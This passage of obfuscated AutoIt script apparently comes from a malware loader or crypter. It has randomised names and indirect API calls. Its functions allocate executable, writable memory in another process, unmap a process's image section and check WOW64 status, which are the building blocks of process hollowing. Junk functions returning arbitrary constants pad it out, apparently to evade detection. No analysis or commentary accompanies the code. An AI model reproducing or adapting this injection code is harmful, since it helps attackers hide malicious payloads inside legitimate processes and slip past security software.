		$VAR_312 = $VAR_1453 ( "kernel32.dll" , "ptr" , "VirtualAllocEx" , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , $VAR_454 , "dword_ptr" , $ADVTW_1LMBH7BNL_S_M , "dword" , 12288 , "dword" , 64 )
		If @error Or Not $VAR_312 [ 0 ] Then
			Return $VAR_2415 ( 1 , 0 , 0 )
		EndIf
	EndIf
	Return $VAR_312 [ 0 ]
EndFunc
Func PYPXYFUNC ( $HOHYAHKSZBCHZRKXJ , $ADVTW_1LMBH7BNL_S_M )
	Local $VAR_312 = $VAR_1453 ( "kernel32.dll" , "ptr" , "VirtualAllocEx" , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , 0 , "dword_ptr" , $ADVTW_1LMBH7BNL_S_M , "dword" , 12288 , "dword" , 64 )
	If @error Or Not $VAR_312 [ 0 ] Then
		Return $VAR_2415 ( 1 , 0 , 0 )
	EndIf
	Return $VAR_312 [ 0 ]
EndFunc
Func BOKYSOG ( $HOHYAHKSZBCHZRKXJ , $VAR_454 )
	$VAR_1453 ( "ntdll.dll" , "int" , "NtUnmapViewOfSection" , "ptr" , $HOHYAHKSZBCHZRKXJ , "ptr" , $VAR_454 )
	If @error Then
		Return $VAR_2415 ( 1 , 0 , 0 )
	EndIf
	Return 1
EndFunc
Func KITVP_YMCM_XYQMQHML ( $HOHYAHKSZBCHZRKXJ )
	Local $VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , "IsWow64Process" , "handle" , $HOHYAHKSZBCHZRKXJ , "bool*" , 0 )
	If @error Or Not $VAR_312 [ 0 ] Then
		Return $VAR_2415 ( 1 , 0 , 0 )
	EndIf
	Return $VAR_312 [ 2 ]
EndFunc
Func PYSTQFUNC ( )
	Global $G_MLALOUOOIMDTNIQOYUWMHGGM = 16444
EndFunc
Func FUNC_3608 ( )
	Return 202
EndFunc
Func XCJDDHSHCHCOWOCPKBHT ( )
	Return 52251
EndFunc
Func FUNC_3130 ( )
	Global Const $FVCOTYPLEVFTKAVQP = 195
EndFunc
Func AYDQJBTCUNQYLVFUOTAFUNC ( )
	Return 660938059
EndFunc
Func FUNC_2319 ( )
	Global Const $IMPZEMOSJLM = 25942
EndFunc
